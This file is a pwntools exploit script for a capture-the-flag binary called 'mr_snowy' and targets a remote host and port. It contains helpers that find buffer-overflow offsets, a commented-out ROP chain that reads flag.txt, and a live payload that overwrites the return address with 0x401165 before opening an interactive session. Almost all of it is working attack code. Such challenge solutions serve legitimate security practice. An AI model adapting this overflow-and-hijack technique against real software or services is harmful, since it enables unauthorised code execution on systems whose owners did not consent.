#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe  = pwn.context.binary = pwn.ELF('mr_snowy')

pwn.context(terminal=['tmux', 'new-window'])
pwn.context.log_level = 'DEBUG'

pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False


host = pwn.args.HOST or '138.68.183.216'
port = int(pwn.args.PORT or 30766)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
b *0x004013bc
b *0x00401469
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

def GetOffsetStdin():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process(exe.path)
    p.sendline(pwn.cyclic(512))
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst


def GetOffsetArgv():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process([exe.path, cyclic(512)])
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst



#rop_chain = pwn.ROP(exe)
#rop_chain.call(0x004015c3, [0])

#rop_chain.fgets(exe.bss(0x80))

#rop_chain.fopen('flag.txt', 'alksjdlkasjdk')
#rop_chain.read(0x1, exe.bss(0x80))

#rop_chain.fwrite(exe.bss(0x80), 1, 0x1, 0x1)

#rop_chain.exit()
#print('rop_chain.raw ' + rop_chain.dump())

io.recvuntil(">")
io.sendline("1")
io.recvuntil(">")
io.sendline(b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa" + pwn.p64(0x401165))
#io.sendline(b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa" + pwn.p64(0x004015c3))
io.interactive()
